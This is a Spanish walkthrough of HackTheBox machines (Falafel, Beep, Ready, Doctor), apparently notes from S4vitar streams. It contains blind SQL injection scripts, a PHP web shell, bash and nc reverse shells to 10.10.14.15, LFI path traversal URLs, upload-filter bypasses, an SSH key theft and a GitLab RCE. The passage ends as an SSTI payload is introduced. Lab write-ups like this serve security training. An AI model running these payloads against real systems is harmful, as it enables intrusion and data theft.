Si miramos por la url `http://10.10.10.73/cyberlaw.txt` vemos el contenido de un email enviado por `admin@falafel.htb` a `lawyers@falafel.htb` y a 
`devs@falafel.htb`. El email nos dice que un usuario llamado `chris` a contactado a `admin@falafel.htb` para decirle que a podido logearse con este usuario
sin proporcionar contraseña y que a podido tomar el control total de la web usando la functionalidad du subida de imagenes. No se sabe como lo a echo.

Si vamos al panel de login y probamos con los usuarios encontrado, vemos un mensaje differente para los usuarios admin y chris que por los usuarios dev y lawyers.
Nos hace pensar que admin y chris son validos.

El usuario a podido entrar por la funccion de upload de imagenes. Si intentamos ir a la url `http://10.10.10.73/upload.php` hay una redireccion automatica hacia el
panel de login. Comprobamos con Burpsuite si el redirect a sido sanitizado correctamente.

### Control de la redireccion con Burpsuite {-}

Primeramente controlamos si burpsuite intercepta no unicamente las requests pero tambien las respuestas al lado del servidor. Si es el caso,
lanzamos una peticion desde el navigador al la url `http://10.10.10.73/upload.php` y cuando interceptamos el 302 Redirect, lo cambiamos a 200 pero en este
caso parece que la redirection a sido bien sanitizada porque solo vemos una pagina en blanco.



<!--chapter:end:34-Falafel/34-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Blind SQL Injection {-}

Como no podemos utilizar el `upload.php` solo nos queda que intentar cosas con el panel de login.
Como sabemos que el usuario **admin** existe, probamos cosas como:

- admin:test -> Wrong identification: admin
- admin':test -> Try Again
- admin' and sleep(5)-- -:tes -> Hacking attempt detected
- ():test -> Try Again
- sleep:test -> Hacking attempt detected
- admin' order by 100-- -:test -> Try Again
- admin' order by 3-- -:test -> Wrong identification: admin
- admin' order by 4-- -:test -> Wrong identification: admin
- admin' order by 5-- -:test -> Try Again
- admin' union select 1,2,3,4-- -:test -> Hacking attempt detected
- select:test -> Try Again
- union:test -> Hacking attempt detected
- dsafdasdfuniondasfasdf:test -> Hacking attempt detected

Estas pruebas nos dan, como informacion, que el panel de login parece ser vulnerable a SQLI, que palabras como union o sleep estan black listeadas y 
que la respuesta de la llamada SQL tiene 4 columnas. Vamos a validar la respuesta de la web en caso de un error y en caso de una buena formula.

- admin' and substring(username,1,1)='a'-- -:test -> Wrong identification: admin
- admin' and substring(username,1,1)='b'-- -:test -> Try Again
- admin' and substring(username,2,1)='d'-- -:test -> Wrong identification: admin
- admin' and substring(username,2,1)='w'-- -:test -> Try Again

Aqui ya vemos que typo de ataque podriamos hacer y tito s4vitar nos quiere enseñarnos como hacer un ataque de typo Cluster Bomb con BurpSuite aunque tiraremos de
un script en python que es mucho mas agil.

#### Cluster Bomb attack con BurpSuite {-}

1. Interceptamos y modificamos la SQLI desde BurpSuite

    <div class="figure">
    <img src="images/Falafel-SQLI-intercept.png" alt="Burp sqli interception" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-70)Burp sqli interception</p>
    </div>

1. Con Ctrl+i lo enviamos al intruder
1. En el nodo Positions damos al boton `clear §` y selectionamos:
    
    - el primer 1 y le damos al boton `add §`
    - la letra a y le damos al boton `add §`
    - cambiamos el attack type para que valga `Cluster Bomb`

    <div class="figure">
    <img src="images/Falafel-ClusterBomb-config-payload.png" alt="Burp Cluster Bomb config" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-71)Burp Cluster Bomb config</p>
    </div>

1. En el nodo Payloads, seleccionamos el Payload set numero 1
   
    - cambiamos el payload type a Numbers
    - cambiamos el Number range en sequential From 1 To 5 con step de 1
    - sacamos el URL encode del final de la pagina

    <div class="figure">
    <img src="images/Falafel-ClusterBomb-config-payload1.png" alt="Burp Cluster Bomb config set 1" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-72)Burp Cluster Bomb config set 1</p>
    </div>

1. En el nodo Payloads, seleccionamos el Payload set numero 2
   
    - cambiamos el payload type a Brute forcer
    - cambiamos el Character set a `abcdefghijklmnopqrstuvwxyz` con un Min length de 1 y un Max length de 1
    - sacamos el URL encode del final de la pagina

    <div class="figure">
    <img src="images/Falafel-ClusterBomb-config-payload2.png" alt="Burp Cluster Bomb config set 2" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-73)Burp Cluster Bomb config set 2</p>
    </div>

1. En el nodo Options En el Grep - Match

    - damos al boton Clear
    - añadimos `Wrong identification`
    
    <div class="figure">
    <img src="images/Falafel-ClusterBomb-config-matcher.png" alt="Burp Cluster Bomb config matcher" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-74)Burp Cluster Bomb config matcher</p>
    </div>
    
1. Le damos al boton start attack

Aqui vemos que el resultado es un poco complicado pero se podria hacer de esta forma.

#### Cluster Bomb attack version Python {-}

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import pdb
import signal
import time
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.73/login.php"
s = r'abcdef0123456789'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p2 = log.progress("Password")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    password = ""

    for position in range(1, 40):
        for character in s:
            p1.status("Probando caracter %c en la posiciÃ³n %d" % (character, position))
            post_data = {
                'username': "chris' and substring(password,%d,1)='%c'-- -" % (position, character),
                'password': 'admin'
            }

            r = requests.post(login_url, data=post_data)

            if "Wrong identification" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```

Cambiando el nombre de usuario, podemos buscar la contraseña del usuario chris y admin. una vez lanzado el script, podemos recoger 
la contraseña md5 de cada uno de estos usuarios.

### Crackeamos las contraseñas con crackstation {-}

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos la contraseña del usuario `chris`.

### Loggearse como el usuario admin {-}

Aqui es donde viene toda la parte mas interesante de la maquina. Si nos connectamos como el usuario **chris** vemos que habla de juggling pero poco mas.
Si intentamos connectar a la url `http://10.10.10.73/upload.php` todavia hay una redireccion. Como habla de juggling, pensamos en seguida en una vulnerabilidad
de typo **type juggling** pero tampoco es esto. Esta via se parece mas a un rabbit hole que otra cosa.

Si analyzamos las contraseñas, mejor dicho los hashes encontrados:

- admin:0e462096931906507119562988736854
- chris:d4ee02a22fc872e36d9e3751ba72ddc8

Nos damos cuenta que el hash del usuario chris contiene letras y numeros pero la del usuario admin solo contiene numeros. Porque digo que solo contiene numeros?
Porque si pensamos en forma mathematica, la letra `e` corresponde a un **por 10 elevado a** (en este caso 0 por 10 elevado a 462096931906507119562988736854) al final
solo son numeros.

La vulnerabilidad aqui viene si dos condiciones existen:

1. En `php` la comparativa esta exprimida con un `==` y no con un `===`
1. Si el hash md5 de una contraseña empieza por 0e*xxxxxxxxxxxx...*

Porque succede esta vulnerabilidad? Porque si los hashes de las 2 contraseñas empiezan por 0e*xxx...* y que la comparativa es unicamente de doble igual, como no 
va a comparar de manera stricta, 0 por 10 elevado a cualquier cos (que vale 0) comparado a 0 por 10 elevado a cualquier otra cosa (que tambien vale 0) **SON IGUALES**.

Si miramos por google por `0e hash collision` por ejemplo el articulo de [ycombinator](https://news.ycombinator.com/item?id=9484757), vemos quel hash md5 de `240610708`
da un hash `0e462097431906509019562988736854` o el hash md5 de `QNKCDZO` nos da `0e830400451993494058024219903391`.

En php, si la comparativa es con un doble igual, estos dos hashes son iguales. Si vamos a la pagina de login y entramos el usuario *admin* y la contraseña *QNKCDZO*,
conseguimos loggearnos como el usuario admin.

### Burlar el upload de imagenes {-}

Una vez loggeados entramos en el panel de upload. Aqui la web nos pone de uploadear una imagen desde una url. Recuperamos una imagen de pollo en la web y la copiamos
en nuestro directorio de trabajo. Lanzamos un servidor web con python `python3 -m http.server 80` y uploadeamos el fichero desde la web poniendo la url `http://10.10.14.15/madafackingchicken.png`.

Aqui nos sale un Output con el commando lanzado por la maquina victima :

```bash
CMD: cd /var/www/html/uploads/0026-2354_e426c9e8c2f64caa; wget 'http://10.10.14.15/madafackingchicken.png'
```

Si miramos en la url `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/madafackingchicken.png` vemos la imagen del pollo que hemos enviado a la web.

#### wget vulnerabilidad {-}

Tito S4vitar nos avanza aqui que el programa solo permite enviar ficheros con extension `png` o sea ya sabemos que no podemos enviar ficheros `.php`. Pero como
conocemos el commando echo por la maquina victima, y vemos que se utiliza el commando wget, ya tenemos una via potencial de ataque, el nombre de caracteres del nombre del fichero.
En linux, un fichero solo puede tener un nombre de fichero inferior a 255 caracteres incluida la extension. En el caso de un ficher `.png`, el limite maximo de un fichero
seria un nombre de 251 caracteres seguidos de la extension `.png`.

Copiando el resultado del comando `python -c "A"*251 + ".png"` y cambiando el nombre del fichero `madafackingchicken.png` con ello, si uploadeamos este fichero en la web,
vemos que en el resultado de **Saving To** que solo guarda un 235 "A" como nombre de fichero. Esto quiere decir que si enviamos un ficher que tiene como nombre `231 A` con una extesion `.php.png`
la web va a ver que el fichero es un ficher `.png` pero al momento de guardarlo, va a guardar los 235 primeros caracteres que equivalen a `231 A` y la extension `.php`

Creamos un fichero php

```php
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
vi AAAAAA*

<?php
    echo "<pre>" .shell_exec($_REQUEST['cmd']) ."</pre>";
?>
```

Si enviamos este fichero, vemos que el fichero se a enviado como fichero **.png** pero salvado como fichero **.php** si vamos a la url `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=whoami`
vemos que somos `www-data`.

<!--chapter:end:34-Falafel/34-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la s4vishell.php {-}

1. Creamos un fichero index.html con el contenido siguiente

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.15/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python3 -c http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. desde la web lanzamos el comando `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=curl 10.10.14.15 | bash`

ganamos accesso al systema como el usuario www-data

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Vemos aqui que no podemos leer la flag porque no podemos entrar en las carpetas de **yossi** o de **moshe**. Tenemos que hacer un user pivoting.

### User Pivoting {-}

```bash
whoami
cd /home
cd yossi
cd moshe
sudo -l
find \-perm -4000 2/dev/null
cd /var/www/html
ls
cat connection.php
```

Aqui vemos que no tenemos permisos interesantes pero vemos en el ficher `connection.php` unas credenciales para el usuario `moshe` para la base de datos.

```bash
su moshe
Password:

whoami
#Output
moshe

cat /home/moshe/user.txt
```

Ahora que tenemos la flag, pasamos a la parte **PrivEsc**

<!--chapter:end:34-Falafel/34-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
uname -a
lsb_release -a
sudo -l
id
```

Aqui llama el atencion el grupo video. Pero aqui primero la idea es ver que grupo tiene este mismo grupo por script.

```bash
groups
for group in $(groups); do echo "El grupo $group"; done
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que el fichero `/dev/fb0` esta en el grupo **video**. Este servicio permite hacer una captura de pantalla de la maquina.

1. Recoger las proporciones de la pantalla

    ```bash
    cd /
    find \-name virtual_size 2>/dev/null
    cat ./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size
    #Output
    1176.885
    ```

1. Captura de la pantalla

    ```bash
    cd /tmp
    cat /dev/fb0 > Captura
    du -hc Captura
    file Captura
    ```

1. Enviamos la captura a nuestra maquina de atacante

    - en la maquina de atacante

        ```bash
        nc -nlvp 443 > Captura
        ```

    - en la maquina victima

        ```bash
        nc 10.10.14.15 443 < Captura
        ```

1. Abrimos la captura con Gimp

    - Aun que la apertura del fichero a fallado le damos al menu Archivo > Abrir 
    - Seleccionamos el typo de archivo Datos de imagen en bruto

        <div class="figure">
        <img src="images/Falafel-open-capture.png" alt="Gimp - Archive brute data" width="90%" />
        <p class="caption">(\#fig:unnamed-chunk-75)Gimp - Archive brute data</p>
        </div>

    - Entramos la proporciones de la virtual_size

Aqui podemos ver la contraseña del usuario yossi. Cambiamos de usuario con el comando `su yossi`.

Desde aqui volmemos a intentar a rootear la maquina desde el usuario yossi.

```bash
sudo -l
id
```

Como otra vez un grupo, en este caso el grupo disk nos llama la atencion, volmemos a hacer lo mismo con el listeo de ficheros de cada grupo

```bash
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que `/dev/sda1` es parte del grupo disk. Si le hacemos un ``ls -l /dev/sda1` podemos ver que el grupo disk tiene derecho de escritura. 
Controlamos si estamos en `/dev/sda1` con el comando `fdisk -l` y vemos que es el disco con 7G (El mas grande = el disco en uso).

Siendo del grupo disk, nos permite abrir la utilidad `debugfs` que nos permite manejar utilidades del disco como root.

```bash
debugfs /dev/sda1
pwd
ls
cd /root
pwd
cat root.txt
```

Aqui podemos ver la flag, pero nosotros queremos ser root. Continuamos

```bash
cd .ssh
cat id_rsa
```

la copiamos y creamos un fichero id_rsa en /tmp

```bash
exit
cd /tmp
nano id_rsa

chmod 600 id_rsa
ssh root@localhost -i id_rsa
whoami
#Output 

root
```

<!--chapter:end:34-Falafel/34-04-PrivilegeEscalation.Rmd-->

# Beep {-}

## Introduccion {-}

La maquina del dia 27/08/2021 se Beep.

El replay del live se puede ver aqui

[![S4vitaar Beep maquina](https://img.youtube.com/vi/6pqd0QOc2Oc/0.jpg)](https://www.youtube.com/watch?v=6pqd0QOc2Oc)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:35-Beep/35-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.7
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.7
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000, 10.10.10.7 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 25     | ssh           | Conneccion directa | usuario y contraseña |
| 80     | http          | Web, Fuzzing       |                      |
| 110    | pop3          |                    |                      |
| 111    | rpcbind       |                    |                      |
| 143    | imap          |                    |                      |
| 443    | https         | Web, Fuzzing       |                      |
| 878    | rpc           |                    |                      |
| 993    | ssl/imap      |                    |                      |
| 995    | pop3          |                    |                      |
| 3306   | mysql         |                    |                      |
| 4190   | sieve cyrus   |                    |                      |
| 4445   | upnotifyp     |                    |                      |
| 4559   | HylaFAX       |                    |                      |
| 5038   | asterisk      |                    |                      |
| 10000  | http miniserv |                    |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.7
```

Es un Apache 2.2.3 sobre un CentOS y habla de redirection sobre el protocolo https.

#### Checkear la web {-}

Cuando nos connectamos por el puerto 80, se ve la redirection al puerto 443 y entramos directo
en un panel de authentificacion `elastix`.

Si miramos el miniserv del puerto **10000** tambien vemos un panel de login.

En este caso buscamos por una vulnerabilidad associada a `elastix`

<!--chapter:end:35-Beep/35-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Elastix {-}

```bash
searchsploit elastix
```

Aqui vemos una serie de exploits y un script escrito en perl nos llama la atencion, porque permite hacer un
Local File Inclusion.

```bash
searchsploit -x 37637
```

Vemos que el exploit pasa por una url que usa path traversal `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
En este caso el fichero `/etc/amportal.conf` lo miramos mas tarde y empezamos primero con enumerar informaciones de la maquina.

Le metemos en firefox la url siguiente: `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
y podemos ver el fichero.

Vemos que hay multiples usuarios con una `/bin/bash`

- fanis
- spamfilter
- asterisk
- cyrus
- mysql
- root

Usamos el LFI para enumerar la maquina

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/tcp%00&module=Accounts&action
```

El fib_trie no nos muestra nada pero el tcp nos muestra los puertos internos que estan abiertos. Lo copiamos y lo pegamos en un fichero.
Como los puertos estan representado de forma hexadecimal, tenemos que tratar la data.

```bash
cat data.txt | tr ':' ' ' | awk '{print $3}' | sort -u

python3
>>> 0x0016
22
>>> 0x0019
25
>>> 0x0050
80
...
```

En el caso de un LFI ficheros interessantes podrian tambien ser `/proc/shed_debug` y `/proc/shedstat`. En este caso no sirbe pero esta
bien tenerlo en cuenta.

Si miramos el fichero del exploit `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..///etc/amportal.conf%00&module=Accounts&action`
Vemos un fichero de configuracion con credenciales para una base de datos.

Si vamos por el panel de login y probamos usuarios, nos podemos connectar como el usuario admin.

Como tenemos contraseñas, intentamos connectarnos con el usuario admin pero no va.
Intentamos como el usuario root y la misma contraseña y entramos en el panel de configuracion de **webmin**.

> [ ! ] NOTAS: Tito S4vitar nos avanza que se puede ganar accesso al systema desde el dashboard de elastix y tambien del webmin pero aqui tiraremos de otras vias.


<!--chapter:end:35-Beep/35-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde el vtiger {-}

Si analyzamos la url `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action`, vemos
una parte que seria `https://10.10.10.7/vtigercrm`. Si vamos en esta url hay otro panel de session.

Copiando una vez mas las credenciales del usuario admin, podemos entrar en el dashboard de **vtiger CRM**.

Aqui la idea para ganar accesso al systema, viene de una vulnerabilidad que pasa por cambiar el logo de la compania con un fichero de doble extension.

Si vamos a `Settings > Settings > Company Details > edit`, aqui vemos que podemos cargar un fichero `.jpg` para cambiar el logo de la empresa.

1. Creamos un fichero con doble extension s4vishell.php.jpg

    ```php
    <?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f");
    ?>
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Uploadeamos el fichero a la web y cuando le damos a save ya hemos ganado accesso al systema.


```bash
whoami
#Output
asterisk
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```





<!--chapter:end:35-Beep/35-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
sudo -l
```

Aqui vemos que tenemos derechos de ejecutar como el usuario root muchos binarios si proporcionar contraseña. Entre ellos

- /bin/chown
- /bin/chmod
- /sbin/service
- /usr/bin/nmap

Aqui tiramos por el binario de nmap

```bash
nmap --version
#Output
4.11

sudo nmap --interactive
!sh
whoami
#Output 
root
```

Ya estamos root y podemos leer las flags.

### Otra forma de rootear la maquina {-}

Tambien podriamos rootear la maquina mediante un shellshock attack.

Si vamos a la url de login del puerto 10000 `https://10.10.10.7:10000/session_login.cgi`, vemos que el fichero es un fichero con extension `.cgi`.
Un shellshock attack pasa por burlar el user-agent de la peticion. Para esto utilizamos Burpsuite.

1. Una vez interceptada la peticion a la url de login.cgi, cambiamos la cabezera del User-Agent de la siguiente forma:

    <div class="figure">
    <img src="images/Beep-shellshock-reverse-shell.png" alt="Beep shellshock" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-76)Beep shellshock</p>
    </div>

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En Burpsuite le damos a Forward

Y ganamos accesso al systema como el usuario root ;)


<!--chapter:end:35-Beep/35-04-PrivilegeEscalation.Rmd-->

# Ready {-}

## Introduccion {-}

La maquina del dia se llama Ready.

El replay del live se puede ver aqui

[![S4vitaar Ready maquina](https://img.youtube.com/vi/DRSMsAKuXX0/0.jpg)](https://www.youtube.com/watch?v=DRSMsAKuXX0)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:36-Ready/36-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.220
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.220
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.220 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5080 10.10.10.220 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 5080   | http          | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.220
```

Es un nginx con gitlab y nos reporta un redirect al http://10.10.10.220/users/sign_in 

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.220:5080` nos redirige automaticamente a la pagina de Sign in de gitlab Community edition.
Siendo un gitlab podemos ver el `robots.txt`.

Vemos routas que pueden ser interesantes como

- /api


En el caso de la routa `/api` si tiramos de esta routa con firefox, vemos que necessitamos logearnos para continuar. Pero en ciertos casos,
hay possibilidades de poder, de forma no authenticada, obtener informaciones relevantes.

Si buscamos en google por `gitlab api`, vemos de que manera podemos utilizar la api para recoger informaciones.

```bash
curl -s -X GET "http://10.10.10.220:5080/api/v4/version"
```

Aqui vemos que necessitamos un token y para esto tenemos que crearnos un usuario. Lo hacemos desde la web. Una vez hecho nos podemos loggear
y desde la interface de gitlab, si vamos a Settings, nos podemos crear un token. Lo copiamos y lo añadimos a un header con curl.

```bash
curl -s -X GET "http://10.10.10.220:5080/api/v4/version" -H "PRIVATE-TOKEN: 514gTTxhx3qpsBbJbfz9" | jq
```

Aqui vemos que la version de gitlab es la 11.4.7



<!--chapter:end:36-Ready/36-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Gitlab {-}

```bash
searchsploit gitlab 11.4.7
```

Aqui vemos exploits que nos permite hacer Remote Code Execution.



<!--chapter:end:36-Ready/36-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Gitlab {-}

```bash
searchsploit -m 49257
mv 49257.py gitlab_rce.py
vi gitlab_rce.py
```

Mirando el codigo, vemos que este exploit nos permiteria entablar una reverse shell. Modificamos los datos

- url de la maquina victima
- url de la maquina de atacante
- puerto de escucha
- usuario gitlab
- authenticity_token
- cookie de session.

El valor del authenticity token se puede encontrar en el codigo fuente de la pagina de gitlab.
El valor del cookie de session se puede ver en la pagina de gitlab dandole a `Ctrl+Shift+c > Almacenamiento` y podemos ver el `_gitlab_session`

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script con el commando `python3 gitlab_rce.py`


```bash
whoami
#Output
git
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Podemos ir al directorio `/home/dude` y visualizar la flag

<!--chapter:end:36-Ready/36-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
echo $PATH
cd /
find \-perm -4000 2>/dev/null
hostname -I
hostname
```

Aqui podemos ver que el comando `hostname -I` nos da una ip que no es la ip de la maquina victima. Estamos en un contenedor

#### Escapar del contenedor {-}

```bash
cd /
ls -la
cd /opt
ls -l
```

Vemos un fichero `/root_pass` en la raiz, y en el directorio opt vemos un directorio `backup` y `gitlab`.

```bash
cat /root_pass
#Output
YG65407Bjqvv9A0a8Tm_7w

su root
Password: YG65407Bjqvv9A0a8Tm_7w

su dude
Password: YG65407Bjqvv9A0a8Tm_7w
```

No es una contraseña.

```bash
cd /opt
ls 
cd /backup
ls -l

cat docker-compose.yml
cat gitlab-secrets.json
cat gitlab-secrets.json | grep "pass"
cat gitlab-secrets.json | grep "user"
cat gitlab.rb
cat gitlab.rb | grep "pass"
```

Hay mucha informacion en estos ficheros. El gitlab.rb contiene un password para el servicio smtp.

```bash
su root
Password: wW59U!ZKMbG9+*#h
whoami
#Output
root
```

Emos podido passar al usuario root pero del contenedor. Aqui algo que todavia suena turbio es este fichero `root_pass`.
Buscamos en los ficheros la coincidencias de este fichero

```bash
grep -r -i "root_pass" 2>/dev/null
```

Aqui vemos un `/dev/sda2` que parece montado sobre un **root_pass**

```bash
df -h
fdisk -l
```

Aqui vemos que en `/dev/sda2` hay un linux filesystem de 18G que se monta directamente con `/root_pass`. Vamos a intentar montarlo.

```bash
mkdir /mnt/mounted
mount /dev/sda2 /mnt/mounted
ls -l
cd /root
cat root.txt
```

Ademas podemos connectarnos como root directamente a la maquina victima con ssh porque tenemos accesso a la id_rsa del usuario root de la maquina
victima.

<!--chapter:end:36-Ready/36-04-PrivilegeEscalation.Rmd-->

# Doctor {-}

## Introduccion {-}

La maquina del dia se llama Doctor.

El replay del live se puede ver aqui

[![S4vitaar Doctor maquina](https://img.youtube.com/vi/kaHpsn1HLp4/0.jpg)](https://www.youtube.com/watch?v=kaHpsn1HLp4)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:37-Doctor/37-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.209
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.209
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.209 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,8089 10.10.10.209 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 80     | http          | Web, Fuzzing       |                      |
| 8089   | https splunkd | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.209
```

Es un Apache 2.4.41 en un Ubuntu. Vemos un email `info@doctors.htb` Podria ser un usuario y un dominio. Añadimos el dominio al `/etc/hosts`

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.209`, vemos una pagina de un cabinete de doctor. Navigamos un poco en la web pero no hay nada interesante.
Si entramos en la web por el dominio `http://doctors.htb` vemos una nueva pagina. Se esta aplicando virtual hosting. Esta pagina es un login.
El wappalizer nos dice que es un Flask en python.

Aqui de seguida pensamos en un **Template Injection**.

De primeras creamos un nuevo usuario en el panel de registro. 
Vemos que nuestra cuenta a sido creada con un limite de tiempo de 20 minutos. Nos loggeamos y vemos un boton con un numero 1.
Si pinchamos, vemos en la url `http://doctors.htb/home?page=1`. Miramos si se puede aplicar un LFI

```bash
http://doctors.htb/home/page=/etc/passwd
http://doctors.htb/home/page=../../../../../../../../etc/passwd
http://doctors.htb/home/page=../../../../../../../../etc/passwd%00
http://doctors.htb/home/page=../../../../../../../../etc/passwd?
```

Aqui no vemos nada.

Hay un link en la pagina para redactar un nuevo mensaje.

```bash
Title: EEEEEEEEE
Content: Hola
```

Aqui vemos que el mensaje esta visible en la pagina.

> [ ! ] NOTAS: Tito nos habla de probar un RFI (Remote File Inclusion) que seria algo que probar pero nos adelanta que no funcciona en este caso.

Aqui miramos de Injectar etiquetas HTML y XSS pero no funcciona.

<!--chapter:end:37-Doctor/37-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Server Side Template Injection {-}


```bash
Title: {{9*9}}
Content: {{2*3}}
```

Vemos que en esta parte no nos lo interpreta. Si miramos el codigo fuente, vemos que hay un link que esta en la url `http://doctors.htb/archive` y que esta
en beta testing.

Si vamos a la url en question, hay una pagina blanca pero si otra vez, miramos el codigo fuente, en este caso de la pagina `/archive`, podemos ver que hay 
un numero **81**. Quiere decir que en el directorio **archive** esta interpretando el **SSTI** de los mensajes.

El caso del SSTI nos permite injectar comandos a nivel de systema usando el systema de templating. Si vamos a la carpeta **Server Side Template Injection** de
la pagina de [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) podemos copiar la Injeccion
de Jinja2 **Exploit the SSTI by calling Popen without guessing the offset**






<!--chapter:end:37-Doctor/37-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

1. Nos ponemos en escucha por el puerto 443
1. Creamos un nuevo mensaje con el payload

    ```bash
